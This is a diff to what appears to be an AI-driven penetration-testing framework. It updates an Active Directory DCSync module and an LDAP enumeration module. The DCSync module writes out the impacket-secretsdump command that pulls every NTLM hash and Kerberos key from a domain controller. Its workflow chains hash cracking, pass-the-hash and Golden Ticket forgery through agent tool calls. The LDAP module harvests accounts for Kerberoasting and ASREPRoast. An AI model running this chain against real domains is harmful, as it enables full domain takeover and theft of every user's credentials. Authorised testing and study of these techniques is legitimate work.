@@ -254,37 +254,47 @@ class DCSyncAttack(AttackModule):
     name = "DCSyncAttack"
     description = "DCSync: impersonate a Domain Controller via the DRSUAPI MS-DRSR interface to pull all NTLM hashes / Kerberos keys from the domain (requires Replication-Get-Changes rights)"
     target_services = ["ldap", "microsoft-ds", "smb", "drsuapi"]
-    target_ports = [389, 445, 3268]
+    target_ports = [389, 445, 3268, 135]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Wraps dump_credentials MCP tool (DCSync via impacket secretsdump over DRSUAPI). Needs an account with DS-Replication-Get-Changes / Get-Changes-All privileges.",
-            "workflow": [
-                "1. Obtain a credential with replication rights (recovered from ASREPRoast / Kerberoasting / credential dump of an over-privileged account on the owned target).",
-                f"2. Call dump_credentials(target_ip='{ctx.target_ip}', method='dcsync') to invoke impacket-secretsdump over DRSUAPI against the domain controller.",
-                "3. The MCP tool writes NTDS.dit hashes (NTLM, Kerberos keys, LM, password history) into exploit_workspace/<target>/.",
-                "4. Crack NTLM hashes offline (hashcat -m 1000) or pass-the-hash against the owned target only via lateral_exec.",
-            ],
-            "suggested_command": (
-                f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} "
-                f"-just-dc -outputfile ntds_hashes"
+        return self._info_result(
+            ctx,
+            note=(
+                "Wraps dump_credentials MCP tool (DCSync via impacket secretsdump "
+                "over DRSUAPI). Needs an account with DS-Replication-Get-Changes / "
+                "Get-Changes-All privileges. DCSync = domain compromise: "
+                "privilege_level=admin."
             ),
-            "references": [
+            evidence=[
+                "<NTDS_HASHES_FILE: exploit_workspace/<ip>/<attempt>/ntds_hashes.ntds>",
+                "<KRBGTGT_NT: from -just-dc-user krbtgt>",
+                "<DOMAIN_SID: from secretsdump>",
+            ],
+            references=[
                 "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
                 "https://adsecurity.org/?p=1729 (Mimikatz DCSync explanation)",
                 "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr",
             ],
-        }
+            suggested_command=(
+                f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} "
+                f"-just-dc -outputfile ntds_hashes"
+            ),
+            privilege_level="admin",
+            workflow=[
+                "1. Obtain a credential with replication rights (recovered from ASREPRoast / Kerberoasting / credential dump of an over-privileged account on the owned target).",
+                f"2. Call dump_credentials(target_ip='{ctx.target_ip}', method='dcsync') to invoke impacket-secretsdump over DRSUAPI against the domain controller. For GoldenTicket: dump_credentials(method='dcsync', target_user='krbtgt').",
+                "3. The MCP tool writes NTDS.dit hashes (NTLM, Kerberos keys, LM, password history) into exploit_workspace/<target>/.",
+                "4. Crack -> run_hash_crack(hash_value=<NT>, tool='hashcat') (mode 1000) -> cred_store_add. PtH -> PassTheHash. GoldenTicket -> golden_ticket(krbtgt_hash=<from -just-dc-user krbtgt>, sid=<from secretsdump>).",
+            ],
+        )
 
 
 class ADLDAPEnum(AttackModule):
     name = "ADLDAPEnum"
     description = "Anonymous/credentialled LDAP enumeration of Active Directory: users, groups, SPNs, and Domain Admins against the owned DC"
     target_services = ["ldap"]
-    target_ports = [389, 3268]
+    target_ports = [389, 3268, 636, 3269]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
@@ -293,7 +303,19 @@ class ADLDAPEnum(AttackModule):
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Pure-stdlib LDAP enumerator. Targets only ctx.target_ip. Feeds username lists into ASREPRoast / Kerberoasting.",
+            "note": (
+                "Pure-stdlib LDAP enumerator. Targets only ctx.target_ip. Feeds "
+                "username lists into ASREPRoast / Kerberoasting. Captures "
+                "sAMAccountName / servicePrincipalName / userAccountControl so "
+                "preauth-disabled and SPN-backed accounts are classified by "
+                "attribute, not DN substring."
+            ),
+            "credentials_found": [
+                "<USERS_FILE: ...>",
+                "<SPN_ACCOUNTS_FILE: ...>",
+                "<PREAUTH_DISABLED_FILE: ...>",
+            ],
+            "evidence": [f"LDAP enumeration queued against {ctx.target_ip}"],
             "references": [
                 "https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py",
                 "https://ldap.com/ldapv3-wire-protocol-reference/",
